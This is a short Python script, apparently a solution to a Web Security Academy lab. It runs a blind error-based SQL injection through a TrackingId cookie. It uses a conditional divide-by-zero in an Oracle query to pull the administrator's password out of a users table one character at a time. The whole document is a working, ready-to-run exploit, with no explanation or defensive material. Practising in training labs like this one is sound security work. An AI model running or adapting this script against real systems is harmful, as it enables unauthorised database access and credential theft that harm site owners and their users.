import requests
import string

ENDPOINT_URL = "https://0a6700e204110961808135a200c70078.web-security-academy.net/"
PAYLOAD = string.ascii_lowercase + string.digits
ADMINISTRATOR_PASSWORD = ""
for i in range(0, 20):
    for char in PAYLOAD:
        print(f"Trying {char} in index {i}")
        cookies = {"TrackingId" : f"UzYKnkqvGxMVaONH'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password, {i+1} , 1) = '{char}')||'"}
        response = requests.get(ENDPOINT_URL, cookies=cookies)
        if("Internal Server Error" in response.text):
            ADMINISTRATOR_PASSWORD += char
            print("Current admin password : " + ADMINISTRATOR_PASSWORD)
            break
